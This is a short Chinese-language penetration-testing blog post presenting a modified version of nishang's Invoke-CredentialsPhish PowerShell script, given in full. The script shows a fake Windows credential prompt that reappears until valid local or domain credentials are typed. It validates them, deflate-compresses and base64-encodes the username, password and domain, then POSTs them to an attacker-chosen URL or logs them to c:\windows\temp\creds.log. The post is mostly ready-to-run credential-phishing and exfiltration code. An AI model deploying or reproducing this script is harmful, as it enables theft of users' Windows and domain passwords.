---
title: "带有 HTTP 请求的 CredentialsPhish"
date: 2019-07-29T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['powershell']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


因为 nishang 中的 Invoke-CredentialsPhish 只能将用户名和密码输出显示, 所以就自己改了改.

<!--more-->

未指定参数则默认保存在 `c:\windows\temp\creds.log` 中, 指定 url 则会传输 Post Raw  Data, 通过 `php://input` 接收.

使用 nishang 中的 `Invoke-Decode` 解码数据.

```
function Invoke-CredentialsPhish
{
<#
.SYNOPSIS
Nishang script which opens a user credential prompt.

.DESCRIPTION
This payload opens a prompt which asks for user credentials and does not go away till valid local or domain credentials are entered in the prompt.

.PARAMETER Url
The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.

.EXAMPLE
PS > Invoke-CredentialsPhish

.EXAMPLE
PS > Invoke-CredentialsPhish -Url http://example.com/post.php

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>

[CmdletBinding()]
Param (
    [Parameter(Parametersetname="Url")]
    [String]
    $url
)

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("执行此操作需要凭据", "请输入您的用户名和密码", "", "")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
            	$now = Get-Date;
                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:" + $authdomain.name + " " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
                $ms = New-Object IO.MemoryStream
		        $action = [IO.Compression.CompressionMode]::Compress
		        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
		        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
		        $output | ForEach-Object {$sw.WriteLine($_)}
		        $sw.Close()
		        $param = [Convert]::ToBase64String($ms.ToArray())
                if ($url){
			        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
			        $http_request.open("POST", $url, $false) 
			        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
			        $http_request.setRequestHeader("Content-length", $param.length)
			        $http_request.setRequestHeader("Connection", "close") 
			        $http_request.send($param) 
			        $script:session_key=$http_request.responseText
                } else {
                	$filename = "c:\windows\temp\creds.log" 
                	Out-File -FilePath $fileName -Append -InputObject "$param" 
                }
                break
            }
        }
    }
}
```